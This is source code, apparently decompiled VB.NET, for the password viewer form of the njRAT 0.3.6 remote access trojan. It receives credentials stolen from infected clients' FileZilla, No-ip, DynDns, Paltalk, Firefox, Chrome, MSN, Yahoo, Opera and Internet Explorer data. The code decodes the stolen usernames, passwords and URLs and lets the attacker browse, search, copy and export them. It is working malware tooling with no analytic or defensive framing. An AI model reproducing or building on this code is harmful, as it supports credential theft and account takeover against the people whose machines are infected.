Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT.LV
Imports njRAT_0._3._6.njRAT

Public Class Pass
    Private Bo As Boolean
    Private m_SortingColumn As ColumnHeader

    Public Sub New()
        Me.Bo = True
        Me.InitializeComponent()
    End Sub

    Private Sub CopyALLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyALLToolStripMenuItem.Click
        Try
            Dim text As String = ("User=" & Me.L1.SelectedItems.Item(0).Text)
            [text] = String.Concat(New String() {[text], ChrW(13) & ChrW(10) & "Pass=", Me.L1.SelectedItems.Item(0).SubItems.Item(1).Text, ChrW(13) & ChrW(10) & "URL=", Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text})
            If ([text].Length > 0) Then
                Clipboard.SetText([text])
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CopyPassToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyPassToolStripMenuItem.Click
        Try
            If (Me.L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0) Then
                Clipboard.SetText(Me.L1.SelectedItems.Item(0).SubItems.Item(1).Text)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CopySiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopySiteToolStripMenuItem.Click
        Try
            If (Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text.Length > 0) Then
                Clipboard.SetText(Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CopyUserToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyUserToolStripMenuItem.Click
        Try
            If (Me.L1.SelectedItems.Item(0).Text.Length > 0) Then
                Clipboard.SetText(Me.L1.SelectedItems.Item(0).Text)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub FindToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FindToolStripMenuItem.Click
        Try
            Dim str As String = Interaction.InputBox("Search", "", "", -1, -1)
            If (str <> "") Then
                Dim enumerator As IEnumerator
                Dim pass As New Pass
                pass.Name = "e"
                pass.Text = ("Search For '" & str & "'")
                pass.Show()
                Try
                    enumerator = Me.L1.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Dim num As Integer = 0
                        Do While (Strings.InStr(current.SubItems.Item(num).Text.ToLower, str.ToLower, CompareMethod.Binary) <= 0)
                            num += 1
                            If (num <= 2) Then
                            End If
                        Loop
                        Dim item2 As ListViewItem = pass.L1.Items.Add(current.Text, current.ImageIndex)
                        Dim num3 As Integer = (current.SubItems.Count - 1)
                        Dim i As Integer = 1
                        Do While (i <= num3)
                            item2.SubItems.Add(current.SubItems.Item(i).Text)
                            i += 1
                        Loop
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
                pass.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(pass.L1.Items.Count))
                Me.FxCOLM(pass.L1)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub
    Public Sub FxCOLM(ByVal L1 As ListView)
        Dim num2 As Integer = (L1.Columns.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            L1.Columns.Item(i).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
            i += 1
        Loop
    End Sub

    Private Sub InClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InClipboardToolStripMenuItem.Click
        Try
            Dim text As String = Me.SV
            If ([text].Length > 0) Then
                Clipboard.SetText([text])
                Interaction.MsgBox("Saved in Clipboard", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub InDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InDiskToolStripMenuItem.Click
        Try
            If (Me.sf.ShowDialog = DialogResult.OK) Then
                File.WriteAllText(Me.sf.FileName, Me.SV)
                Interaction.MsgBox(Me.sf.FileName, MsgBoxStyle.ApplicationModal, Nothing)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub L1_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles L1.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = Me.L1.Columns.Item(e.Column)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        Else
            If header.Equals(Me.m_SortingColumn) Then
                If Me.m_SortingColumn.Text.StartsWith("> ") Then
                    ascending = SortOrder.Descending
                Else
                    ascending = SortOrder.Ascending
                End If
            Else
                ascending = SortOrder.Ascending
            End If
            Me.m_SortingColumn.Text = Me.m_SortingColumn.Text.Substring(2)
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Text = ("> " & Me.m_SortingColumn.Text)
        Else
            Me.m_SortingColumn.Text = ("< " & Me.m_SortingColumn.Text)
        End If
        Me.L1.ListViewItemSorter = New clsListviewSorter(e.Column, ascending)
        Me.L1.Sort()
        Me.L1.ListViewItemSorter = Nothing
    End Sub

    Private Sub L1_DoubleClick(sender As Object, e As EventArgs) Handles L1.DoubleClick
        Try
            Process.Start(Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Pass_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Try
            Me.L1.Columns.Item(3).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub RemoveEmptyPWToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveEmptyPWToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(1).Text = "") Then
                    current.Remove()
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
    End Sub
    Public Function SV() As String
        Dim str As String
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = String.Concat(New String() {str, "URL=", current.SubItems.Item(2).Text, ChrW(13) & ChrW(10) & "USER=", current.Text, ChrW(13) & ChrW(10) & "PASS=", current.SubItems.Item(1).Text, ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)})
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Return str
    End Function

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Me.Bo = True
        Me.L1.BringToFront()
    End Sub
    Public Sub XD(ByRef c As Client, ByRef S As String)
        Dim strArray2 As String() = Strings.Split(S, " ", -1, CompareMethod.Binary)
        Dim imageIndex As Integer = -1
        Dim strArray As String() = New String() {"FileZilla", "No-ip", "DynDns", "Paltalk", "FireFox", "Chrome", "MSN", "Yahoo", "Opera", "Internet Explorer"}
        Dim strArray5 As String() = strArray2
        Dim index As Integer = 0
        Do While True
            If (index >= strArray5.Length) Then
                Exit Do
            End If
            Dim sy As String = strArray5(index)
            Try
                If (sy.Length > 0) Then
                    If (sy = "*") Then
                        imageIndex += 1
                    Else
                        If Not sy.Contains(":") Then
                            sy = FN.DEB(sy)
                        End If
                        Dim strArray3 As String() = Strings.Split(sy, ":", -1, CompareMethod.Binary)
                        If (strArray3.Length > 3) Then
                            strArray3 = Strings.Split(Strings.Replace(S, (strArray3(0) & ":" & strArray3(1)), FN.ENB((strArray3(0) & ":" & strArray3(1))), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary)
                        End If
                        Dim item As New ListViewItem
                        item = Me.L1.Items.Add(FN.DEB(strArray3(1)), imageIndex)
                        item.SubItems.Add(FN.DEB(strArray3(2)))
                        item.SubItems.Add(FN.DEB(strArray3(0)))
                        item.SubItems.Add(strArray(imageIndex))
                        NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(ind.vno(c.L))}, Nothing, Nothing, Nothing, True)
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError()
            End Try
            index += 1
        Loop
        Me.FxCOLM(Me.L1)
        Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
    End Sub


End Class